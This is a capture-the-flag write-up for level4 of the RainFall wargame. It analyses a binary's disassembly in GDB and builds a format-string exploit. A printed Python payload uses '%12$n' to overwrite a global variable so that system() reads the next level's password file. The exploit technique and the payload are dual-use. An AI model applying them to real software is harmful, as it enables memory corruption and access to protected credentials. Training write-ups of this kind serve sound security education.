# Level4 - ASM Analysis (GDB only)

## Prerequisites for Exploitation

Before performing any kind of exploitation, we assess the security mitigations in place for this binary.

### 1. Address Space Layout Randomization (ASLR)

Check if ASLR is enabled:

```bash
level4@RainFall:~$ cat /proc/sys/kernel/randomize_va_space
0
```

A value of `0` means ASLR is **disabled**, memory addresses will remain consistent across executions, which simplifies our analysis.

### 2. Stack Protections

Check protections with `checksec`:

```bash
level4@RainFall:~$ checksec --file ./level4
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   ./level4
```

**Interpretation:**

* No RELRO: no protection for GOT.
* No Canary: we can overwrite the stack freely.
* NX disabled: stack is executable, though unused here.
* No PIE: binary loads at a fixed address.

**Conclusion:**

The binary includes **no modern protections**. It is a perfect candidate for classic exploitation techniques. In this case, our approach will revolve around a **format string vulnerability**, similar to level3, but this time wrapped inside an additional indirection through a helper function.

## Disassembly Analysis

This section provides a detailed analysis of the assembly code for the three functions in the `level4` binary, using GDB. Each instruction is interpreted to understand control flow, memory interactions, and the underlying vulnerability.

### Disassembly of `main()`

#### Function Prologue and Call

```asm
0x080484a7 <+0>:     push   %ebp
0x080484a8 <+1>:     mov    %esp,%ebp
0x080484aa <+3>:     and    $0xfffffff0,%esp
0x080484ad <+6>:     call   0x8048457 <n>
0x080484b2 <+11>:    leave
0x080484b3 <+12>:    ret
```

<+0>: Save the caller's base pointer.  
<+1>: Set up a new stack frame.  
<+3>: Align the stack to a 16-byte boundary (compiler convention).  
<+6>: Call the function `n()`.  
<+11>: Restore the previous base pointer and stack pointer.  
<+12>: Return to the caller.  

The `main` function is a thin wrapper. It delegates all logic to `n()`.

---

### Disassembly of `n()`

#### Function Prologue

```asm
0x08048457 <+0>:     push   %ebp
0x08048458 <+1>:     mov    %esp,%ebp
0x0804845a <+3>:     sub    $0x218,%esp
```

<+0>: Save the base pointer of the caller.  
<+1>: Create a new stack frame.  
<+3>: Reserve 536 bytes of local stack space (includes a 520-byte buffer).  

#### Safe Input Read via fgets

```asm
0x08048460 <+9>:     mov    0x8049804,%eax
0x08048465 <+14>:    mov    %eax,0x8(%esp)
0x08048469 <+18>:    movl   $0x200,0x4(%esp)
0x08048471 <+26>:    lea    -0x208(%ebp),%eax
0x08048477 <+32>:    mov    %eax,(%esp)
0x0804847a <+35>:    call   0x8048350 <fgets@plt>
```

<+9>: Load the address of `stdin` into EAX.  
<+14>: Set `stdin` as the third argument to `fgets()`.  
<+18>: Set the second argument to 512 (0x200).  
<+26>: Load the address of the local buffer into EAX.  
<+32>: Pass the buffer as the first argument.  
<+35>: Call `fgets(buffer, 512, stdin)`.  

#### Format String Vulnerability

```asm
0x0804847f <+40>:    lea    -0x208(%ebp),%eax
0x08048485 <+46>:    mov    %eax,(%esp)
0x08048488 <+49>:    call   0x8048444 <p>
```

<+40>: Load the address of the buffer into EAX.  
<+46>: Pass it as the sole argument.  
<+49>: Call `p(buffer)`, where the format string vulnerability occurs.  

#### Conditional System Call

```asm
0x0804848d <+54>:    mov    0x8049810,%eax
0x08048492 <+59>:    cmp    $0x1025544,%eax
0x08048497 <+64>:    jne    0x80484a5 <n+78>
```

<+54>: Load the global variable `m` into EAX.  
<+59>: Compare it to `0x1025544`.  
<+64>: If not equal, jump to function epilogue.  

#### Execute System Command

```asm
0x08048499 <+66>:    movl   $0x8048590,(%esp)
0x080484a0 <+73>:    call   0x8048360 <system@plt>
```

<+66>: Push the address of the string "/bin/cat /home/user/level5/.pass".  
<+73>: Call `system()` to reveal the flag.  

#### Function Epilogue

```asm
0x080484a5 <+78>:    leave
0x080484a6 <+79>:    ret
```

<+78>: Restore stack and base pointer.  
<+79>: Return from `n()`.  

The `n()` function reads input using `fgets()`, then passes it unfiltered to `printf()` inside `p()`. If a specific global variable equals `0x1025544`, it executes a command to reveal the flag. Our goal is to overwrite that variable using format string abuse.

---

### Disassembly of `p()`

#### Function Prologue

```asm
0x08048444 <+0>:     push   %ebp
0x08048445 <+1>:     mov    %esp,%ebp
0x08048447 <+3>:     sub    $0x18,%esp
```

<+0>: Save caller’s base pointer.  
<+1>: Set up a new stack frame.  
<+3>: Reserve 24 bytes of stack space.  

#### Call to printf

```asm
0x0804844a <+6>:     mov    0x8(%ebp),%eax
0x0804844d <+9>:     mov    %eax,(%esp)
0x08048450 <+12>:    call   0x8048340 <printf@plt>
```

<+6>: Retrieve the first argument passed (user input).  
<+9>: Pass it as the sole argument to `printf()`.  
<+12>: Call `printf()`, vulnerable to format string injection.  

#### Function Epilogue

```asm
0x08048455 <+17>:    leave
0x08048456 <+18>:    ret
```

<+17>: Restore stack.  
<+18>: Return to caller.  

This is the vulnerable point. The user-controlled string is passed directly to `printf()` with no format specifier. This opens the door to `%n`-style writes that will allow us to overwrite the global variable checked in `n()`.

## GDB Runtime Analysis

This section documents the dynamic analysis of the `level4` binary using GDB. The goal is to understand the binary's runtime behavior, inspect memory and register states, and perform the exploit **entirely via GDB**.

### Step 1: Inspect the Global Variable `m`

From disassembly, the variable `m` is stored at:

```asm
0x0804848d <+54>:    mov    0x8049810,%eax
```

Let's confirm its current value:

```gdb
(gdb) x/wx 0x08049810
0x8049810 <m>:  0x00000000
```

As expected, the initial value is `0`. We will aim to write `0x1025544` into this location to trigger the call to `system()`.

---

### Step 2: Confirm Stack Layout and Buffer Location

Set a breakpoint right before the call to `p()` in `n()` (offset +49):

```gdb
(gdb) break *0x08048488
(gdb) run
```

Input a marker string when prompted:

```bash
AAAA
```

Inspect stack memory:

```gdb
(gdb) x/40x $esp
0xbffff510:     0xbffff520      0x00000200      0xb7fd1ac0      0xb7ff37d0
0xbffff520:     0x41414141      0xb7e2000a      0x00000001      0xb7fef305
0xbffff530:     0xbffff588      0xb7fde2d4      0xb7fde334      0x00000007
0xbffff540:     0x00000000      0xb7fde000      0xb7fff53c      0xbffff588
0xbffff550:     0x00000040      0x00000b80      0x00000000      0xb7fde714
0xbffff560:     0x00000098      0x0000000b      0x00000000      0x00000000
0xbffff570:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffff580:     0x00000000      0xb7fe765d      0xb7e3ebaf      0x08048285
0xbffff590:     0x00000000      0x00000000      0x00000000      0xb7fe749f
0xbffff5a0:     0xb7fd5000      0x00000002      0x08048240      0xb7fffc00
```

Look for `0x41414141` (our "AAAA") to confirm buffer location.

Check the base pointer and confirm buffer location:

```gdb
(gdb) info registers
eax            0xbffff520       -1073744608
esp            0xbffff510       0xbffff510
ebp            0xbffff728       0xbffff728
```

Now compute the address of the buffer:

```gdb
(gdb) print $ebp - 0x208
$1 = 0xbffff520
```

We also inspect the stack directly:

```gdb
(gdb) x/40x $esp
0xbffff510:     0xbffff520      0x00000200      0xb7fd1ac0      0xb7ff37d0
0xbffff520:     0x41414141      0xb7e2000a      0x00000001      0xb7fef305
0xbffff530:     0xbffff588      0xb7fde2d4      0xb7fde334      0x00000007
0xbffff540:     0x00000000      0xb7fde000      0xb7fff53c      0xbffff588
0xbffff550:     0x00000040      0x00000b80      0x00000000      0xb7fde714
```

We observe our input `AAAA` as `0x41414141` at address `0xbffff520`, which matches the value of `$ebp - 0x208`. This confirms that the buffer used by `fgets()` is located exactly where expected, and our input is reliably accessible for format string exploitation.

---

### Step 3: Inject Address and Identify Argument Offset

Let's test where our injected address appears on the stack. Use:

```bash
level4@RainFall:~$ python -c 'print "\x10\x98\x04\x08 %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x"' | ./level4
```

Expected output should show the address `0x08049810` around the 12th position on the stack. This allows us to use `%12$n` to perform our write.

---

### Step 4: Attempt Controlled Write Using `%n`

We want to write the value `0x1025544` (decimal `16930116`) using `%n`.

The payload format:

```bash
python -c 'print "\x10\x98\x04\x08" + "%16930112d" + "%12$n"' > /tmp/exploit
```

Note: 4 bytes are already printed due to the address. We subtract those from the total padding.

---

### Step 5: Validate Exploit in GDB

Place breakpoints to monitor state changes:

```gdb
(gdb) break *0x0804848d   # After printf(), before m is checked
(gdb) break *0x08048499   # system() call
(gdb) run < /tmp/exploit
```

When hitting the first breakpoint, inspect:

```gdb
(gdb) x/wx 0x08049810
0x8049810 <m>:  0x1025544
```

Success: the `%n` wrote the correct value into `m`.

Continue execution:

```gdb
(gdb) continue
```

You should hit the second breakpoint:

```gdb
Breakpoint 2, 0x08048499 in n ()
```

Inspect the argument:

```gdb
(gdb) x/s 0x08048590
0x8048590:  "/bin/cat /home/user/level5/.pass"
```

This confirms that the binary will now execute `system("/bin/cat /home/user/level5/.pass")`.

---

### Conclusion

This level demonstrates how a format string vulnerability can be leveraged to perform a controlled memory write by precisely understanding and manipulating the stack layout. Without relying on trial-and-error, we used GDB to verify each step of our exploit, including memory content, register state, and control flow.

We identified:

* The exact address of the target variable `m` at `0x08049810`, loaded in the instruction `mov 0x8049810, %eax`.
* That the value needed to trigger the condition was `0x1025544` (16930116 in decimal).
* The location of the user-controlled buffer on the stack: `0xbffff520`, calculated from `$ebp - 0x208`.
* The correct argument offset for the format string write: `%12$n`.
* That placing the address of `m` at the start of our input aligned it as the 12th argument on the stack.

GDB allowed us to validate each assumption:

* Stack layout: by examining `$esp`, `$ebp`, and dumping memory via `x/40x`.
* Memory write: by confirming the change in `m` via `x/wx`.
* Trigger: by observing the call to `system()` and verifying its argument.

This reinforces the effectiveness of dynamic binary analysis using GDB. By precisely controlling stack input and memory writes, format string vulnerabilities can be exploited without guesswork, even in binaries with some input validation and no buffer overflow.
